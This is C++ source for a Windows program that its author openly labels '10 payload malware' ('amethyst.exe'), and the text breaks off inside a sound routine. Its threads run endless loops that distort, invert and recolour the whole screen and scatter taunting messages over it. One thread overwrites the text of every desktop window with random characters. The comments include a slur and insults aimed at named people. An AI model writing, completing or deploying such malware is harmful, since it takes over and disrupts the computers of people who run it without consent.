// amethyst.exe : 10 payload malware
// named after: https://geometry-dash-fan.fandom.com/wiki/Amethyst
// please use a x86 configuration to compile, or it may not work for your real PC or VM
// was originally gonna be a Hexachlorocyclohexane.exe remake, but since Retarded Zenith simps for it, I decided to keep it original.

#include <Windows.h>
#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#include <math.h>
#include <time.h>
#include <tchar.h>
#define M_PI   3.14159265358979323846264338327950288
HCRYPTPROV hProv;
INT random() {
	if (hProv == NULL)
		if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
			ExitProcess(1);

	INT nOut;
	CryptGenRandom(hProv, sizeof(nOut), (BYTE*)(&nOut));
	return nOut & 0x7fffffff;
}
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
//typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
//typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;

namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!
	//OBS: I used it in 3 payloads

	//Btw ArTicZera created HSV functions, but it sucks unfortunatelly
	//So I didn't used in this malware.

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}
int stage = 0;
int r = 0, g = 0, b = 0;
COLORREF Hue(int shift) { //credits to Malsteve527 for the Hue function
	switch (stage) {
	case 0:
		r = 255;
		b = 0;
		g < 255 ? g += shift : stage++;
		break;
	case 1:
		g = 255;
		b = 0;
		r > 0 ? r -= shift : stage++;
		break;
	case 2:
		g = 255;
		r = 0;
		b < 255 ? b += shift : stage++;
		break;
	case 3:
		b = 255;
		r = 0;
		g > 0 ? g -= shift : stage++;
		break;
	case 4:
		b = 255;
		g = 0;
		r < 255 ? r += shift : stage++;
		break;
	case 5:
		r = 255;
		g = 0;
		b > 0 ? b -= shift : stage = 0;
		break;
	}

	return RGB(r, g, b);
}
LPCWSTR generateRandomUnicodeString(int len) {
	wchar_t* ustr = new wchar_t[len + 1]; // +1 for '\0'
	for (int i = 0; i < len; i++) {
		ustr[i] = (rand() % 1234) + 1000;
	}
	ustr[len] = L'\0';
	return ustr;
}
DWORD WINAPI texts(LPVOID lpParam) {
	while (1) {
		BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam);
		EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);
	}
}
BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
	SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)generateRandomUnicodeString(rand() % 50 + 50), SMTO_ABORTIFHUNG, 100, NULL);
	return true;
}
static FLOAT pfSinVals[4096];

FLOAT FastSine(_In_ FLOAT f)
{
	INT i = (INT)(f / (2.f * M_PI) * (FLOAT)_countof(pfSinVals));
	return pfSinVals[i % _countof(pfSinVals)];
}
VOID InitializeSine(VOID)
{
	unsigned int v0;
	unsigned int* result;
	float X;
	unsigned int i;
	for (i = 0; i <= 0xFFF; ++i)
	{
		v0 = i;
		X = (double)(int)i / 4096.0 * 3.141592 + (double)(int)i / 4096.0 * 3.141592;
		pfSinVals[v0] = sinf(X);
		result = &i;
	}
}
FLOAT FastCosine(_In_ FLOAT f)
{
	return FastSine(f + M_PI / 2.f);
}
VOID Reflect2D(_In_ PINT x, _In_ PINT y, _In_ INT w, _In_ INT h)
{
#define FUNCTION(v, maxv) ( abs( v ) / ( maxv ) % 2 ? ( maxv ) - abs( v ) % ( maxv ) : abs( v ) % ( maxv ) );
	*x = FUNCTION(*x, w - 1);
	*y = FUNCTION(*y, h - 1);
}
DWORD WINAPI shader0(LPVOID lpParam) { //credits to N17Pro3426, but it is SRCAND
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb = ((rgbScreen[i].r | rgbScreen[i].g) | ((rgbScreen[i].g | rgbScreen[i].b) << 16) | ((rgbScreen[i].b | rgbScreen[i].r << 32)));
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCAND);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI shader1(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, NOTSRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb *= ((rgbScreen[i].r | rgbScreen[i].g) | ((rgbScreen[i].g | rgbScreen[i].b) << 16) * ((rgbScreen[i].b | rgbScreen[i].r << 32)));
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, NOTSRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI Sines1(LPVOID lpvoid) {
	float hWnd;
	int x;
	int y;
	int i;
	HDC hdcSrc;
	HBITMAP h;
	int v7;
	int cy;
	int v9;
	int SystemMetrics;
	int v11;
	HDC hdca;
	HDC hdc;
	hdca = GetDC(0);
	SystemMetrics = GetSystemMetrics(0);
	cy = GetSystemMetrics(1);
	v7 = 0;
	h = CreateCompatibleBitmap(hdca, SystemMetrics, cy);
	hdcSrc = CreateCompatibleDC(hdca);
	SelectObject(hdcSrc, h);
	while (1)
	{
		hdc = GetDC(0);
		v11 = GetSystemMetrics(0);
		v9 = GetSystemMetrics(1);
		for (i = 0; i <= 19; ++i)
		{
			++v7;
			BitBlt(hdcSrc, 0, 0, v11, v9, hdc, 0, 0, NOTSRCCOPY);
			for (y = 0; y < v9; ++y)
			{
				hWnd = (double)y / 100000.0 * (double)v7;
				x = (int)(FastSine(hWnd) * 70.f);
				x = (int)(FastCosine(hWnd) * 130.f);
				BitBlt(hdcSrc, x, y, v11, 11, hdcSrc, 0, y, NOTSRCCOPY);
			}
			InitializeSine();
			BitBlt(hdc, 0, 0, v11, v9, hdcSrc, 0, 0, NOTSRCCOPY);
		}
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI shader2(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				INT d = 128 + i;
				INT cx = x - w / 2, cy = y - h / 2; // PEMDAS! Division comes before subtraction, so that will work

				INT dx = cx * cx, dy = cy * cy;
				INT FX = d + (d * tan(sqrt(dx + dy) / d));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);

				hslcolor.h = (FLOAT)fmod((DOUBLE)hslcolor.h + (DOUBLE)(FX) / 100000.0 + 0.09, 1.0);
				hslcolor.s = 1.f;

				if (hslcolor.l < .4f)
				{
					hslcolor.l += .2f;
				}

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI mess(LPVOID lpParam) //credits to sixtyfour64
{
	HDC hdc = GetDC(NULL);
	INT w = GetSystemMetrics(SM_CXSCREEN);
	INT h = GetSystemMetrics(SM_CYSCREEN);

	for (;;)
	{
		for (INT i = 0; i < 5; i++)
		{
			HDC hdc = GetDC(NULL);

			INT nBlockSize = rand() % 129 + 128;
			INT nNewBlockSize = nBlockSize + (rand() % 17 + 16);

			INT x = rand() % (w - nBlockSize);
			INT y = rand() % (h - nBlockSize);

			StretchBlt(hdc, x - (nNewBlockSize - nBlockSize) / 2, y - (nNewBlockSize - nBlockSize) / 2, nNewBlockSize, nNewBlockSize, hdc, x, y, nBlockSize, nBlockSize, !(rand() % 2) ? SRCAND : SRCPAINT);
			Sleep(10);
		}
		ReleaseDC(NULL, hdc);
		Sleep(rand() % 10);
	}
}
DWORD WINAPI shader3(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				INT d = 128 + i;

				INT rw = rand() % w, rh = rand() % h;
				INT cx = x - (rw / 2), cy = y - (rh / 2);

				INT dx = cx * cx, dy = cy * cy;
				INT FX = d + (d * sin(sqrt(dx + dy) / d));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);

				hslcolor.h = (FLOAT)fmod((DOUBLE)hslcolor.h + (DOUBLE)(FX) / 10000.0 + 0.09, 1.0);
				hslcolor.s = 1.f;

				if (hslcolor.l < .4f)
				{
					hslcolor.l += .2f;
				}

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI shader4(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;
	DOUBLE angle = 0.f;

	int ws = w / 2;
	int hs = h / 2;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, ws, hs, hdc, 0, 0, w, h, NOTSRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				//CenterX and CenterY
				int cx = (x - (w / 5));
				int cy = (y - (h / 5));

				//2D Rotating Matrix
				int zx = cos(angle) * cx - sin(angle) * cy;
				int zy = sin(angle) * cx + cos(angle) * cy;

				//Pattern
				int fx = (zx + i) & (zy + i);

				rgbquad[index].rgbRed = fx;
				rgbquad[index].rgbGreen = fx;
				rgbquad[index].rgbRed = fx;
			}
		}

		i++; angle += 0.01f;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, ws, hs, NOTSRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI bounce(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	INT w = GetSystemMetrics(0);
	INT h = GetSystemMetrics(1);
	FLOAT i = 0.f;
	while (1) {
		INT x = cos(i) * 74, y = tan(i) * 54;
		StretchBlt(hdc, x, y, w, h, hdc, 0, 0, w, h, SRCCOPY);
		i += M_PI / 8;
		ReleaseDC(0, hdc);
		Sleep(10);
	}
	return 0x00;
}
DWORD WINAPI textout1(LPVOID lpParam) { //credits to Coder-Linjian, but I cleaned up the code
	HDC hdc = GetDC(NULL);
	HDC hcdc = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);

	LPCSTR text[5] = {
		"very good.",
		"is your name even Kevin",
		"are you even actually 20?",
		"you disrespected me.",
		"Finale is overrated."
	};

	while (1)
	{
		HDC hdc = GetDC(NULL);
		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hcdc, hBitmap);

		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		SetBkMode(hcdc, TRANSPARENT);
		SetTextColor(hcdc, Hue(3));

		HFONT font = CreateFontA(70, 30, 0, 0, FW_NORMAL, 0, 0, 0, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, FF_DONTCARE, "Arial");
		SelectObject(hcdc, font);

		int tmp = rand() % 5;
		TextOutA(hcdc, rand() % w, rand() % h, text[tmp], lstrlenA(text[tmp]));

		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteObject(font);
		DeleteObject(hBitmap);
		Sleep(5);
	}
}
DWORD WINAPI shader5(LPVOID lpvd) //shader5, 10/10 naming im tired, fuck you camellia-y7x btw
{
	int i = 0;
	while (1)
	{
		HDC hdc = GetDC(0);
		HDC hcdc = CreateCompatibleDC(hdc);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);

		BITMAPINFO bmpi = { 0 };
		bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };

		RGBQUAD* rgbquad = NULL;
		HSL hslcolor;

		HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				float fx = (int)((i ^ 4) ^ ((x * y * i) / 2));

				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / h * .2f, 1.f);

				hslcolor.s = 1.f;
				hslcolor.l += .1f;

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;

		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);

		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
		Sleep(10);
	}

	return 0x00;
}
DWORD WINAPI shader6(LPVOID lpvd) //Fuck you still camellia-y7x
{
	int i = 0;
	while (1)
	{
		HDC hdc = GetDC(0);
		HDC hcdc = CreateCompatibleDC(hdc);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);

		BITMAPINFO bmpi = { 0 };
		bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };

		RGBQUAD* rgbquad = NULL;
		HSL hslcolor;

		HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				float fx = (int)((i ^ 4) ^ ((x & y | x ^ y | x + y)));

				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / h * .2f, 1.f);

				hslcolor.s = 1.f;
				hslcolor.l += .1f;

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;

		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);

		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
		Sleep(10);
	}

	return 0x00;
}
FLOAT WINAPI Rotate2DPoint(LPPOINT lpPoint, POINT pCenter, FLOAT angle, INT iCount) {
	for (INT i = 0; i < iCount; i++) {
		FLOAT x = lpPoint[i].x - pCenter.x;
		FLOAT y = lpPoint[i].y - pCenter.y;
		lpPoint[i].x = (INT)(cosf(angle) * x - sinf(angle) * y + pCenter.x);
		lpPoint[i].y = (INT)(sinf(angle) * x + cosf(angle) * y + pCenter.y);
	}
	return 0x00; //sybau :joy:
}
DWORD WINAPI bez(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	INT w = GetSystemMetrics(0);
	INT h = GetSystemMetrics(1);
	FLOAT theta = 0.f;
	INT x = w / 2, y = h / 2;
	INT incrementX = 10, incrementY = 10;
	while (1) {
		HDC hdc = GetDC(0);
		x += incrementX, y += incrementY;
		INT rad = 127;
		INT cx = x + rad, cy = y + rad;
		POINT point[4] = {
			x, cx,
			cy, y,
			cx, cy,
			0, 0
		};
		POINT pCenter = { (x + cx) / 2, (y + cy) / 2 };
		Rotate2DPoint(point, pCenter, theta, 3);
		SelectObject(hdc, CreatePen(PS_SOLID, 20, Hue(3)));
		PolyBezier(hdc, point, 4); // 4 is so the beziers actually show up
		if (x - rad < 0 || x + rad > w) incrementX = -incrementX;
		if (y - rad < 0 || y + rad > h) incrementY = -incrementY;
		theta += 0.05f;
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}
DWORD WINAPI shader7(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;
	INT xxx = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				rgbquad[index].rgbRed = x + xxx;
				rgbquad[index].rgbGreen = y + xxx;
				rgbquad[index].rgbRed = x + y + xxx;
			}
		}

		i++;
		xxx += 5;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI wow(LPVOID lpvd) {
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);

	RECT wRect;
	HWND hwnd = GetDesktopWindow();
	GetWindowRect(hwnd, &wRect);
	int x = wRect.right - wRect.left;
	int y = wRect.bottom + wRect.top;

	while (1)
	{
		HDC hdc = GetDC(0);
		int a = rand() % w, b = rand() % h;

		HBRUSH brush = CreateHatchBrush(rand() % 7, RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);

		BitBlt(hdc, 1, rand() % h, w, 192, hdc, 0, rand() % h, 0x123456);
		BitBlt(hdc, -1, rand() % h, w, -96, hdc, 0, rand() % h, !(rand() % 2) ? SRCAND : SRCERASE);

		StretchBlt(hdc, rand() % 50, rand() % 50, x - 100, y - 100, hdc, 0, 0, x, y, SRCCOPY);
		BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, SRCAND);

		BitBlt(hdc, rand() % 1, rand() % 1, w, h, hdc, rand() % 1, rand() % 1, 0x2837E28);
		StretchBlt(hdc, 1, 1, w - 2, h - 2, hdc, 0, 0, w, h, !(rand() % 2) ? NOTSRCCOPY : SRCINVERT);
		BitBlt(hdc, a, b, 200, 200, hdc, a + rand() % 21 - 10, b + rand() % 21 - 10, !(rand() % 2) ? SRCAND : SRCPAINT);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI shader8(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (int t = 0; ; t *= 10) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (int i = 0; i < w; i++) {
			for (int j = 0; j < h; j++) {
				INT x = i % w, y = i / w;
				rgbScreen[i * j].rgb += (x ^ y | x & y);
			}
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI shader9(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				INT FX = 2 * i;

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);

				hslcolor.h = (FLOAT)fmod((DOUBLE)hslcolor.h + (DOUBLE)(FX) / 10000.0 + 0.09, 1.0);
				hslcolor.s = 1.f;

				if (hslcolor.l < .4f)
				{
					hslcolor.l += .2f;
				}

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
		Sleep(1000);
	}

	return 0x00;
}
DWORD WINAPI rotation(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	FLOAT i = 0;
	while (1) {
		RECT rect;
		HDC hdc = GetDC(0);
		POINT point[3];
		GetWindowRect(GetDesktopWindow(), &rect);
		INT j = cos(i) * 50 + sin(i) * 25;
		point[0].x = rect.left + j; point[0].y = rect.top - j;
		point[1].x = rect.right + j; point[1].y = rect.top + j;
		point[2].x = rect.left - j; point[2].y = rect.bottom - j;
		PlgBlt(hdc, point, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, NULL, 0, 0);
		i += M_PI / 15;
		ReleaseDC(0, hdc);
		Sleep(10);
	}
	return 0x00; //sybau ghjrjfhgjfkjt :joy:
}
VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
